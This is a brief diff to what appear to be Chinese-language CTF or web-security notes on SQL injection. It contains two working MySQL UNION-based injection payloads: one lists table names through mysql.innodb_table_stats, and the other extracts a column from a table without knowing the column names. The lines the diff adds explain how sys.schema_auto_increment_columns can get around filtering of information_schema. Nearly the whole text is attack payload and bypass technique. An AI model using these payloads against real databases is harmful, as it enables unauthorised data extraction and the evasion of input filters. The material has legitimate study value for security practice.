@@ -3,3 +3,6 @@
 payload如下
 0'union select 1,group_concat(table_name),1 from mysql.innodb_table_stats where database_name like database()# 查表名
 0'union select 1,(select group_concat(`3`) from (select 1,2,3 union select * from ccttttfff)n),1# 无列名查询字段
+
+//sys.schema_auto_increment_columns 这个库的配置
+//例如对于一个数据库表中存在的id列，若是设置为int型且自增则会记录于sys.schema_auto_increment_columns中，其中包括了数据库名称等内容，从另一方面绕过了对information_schema的过滤
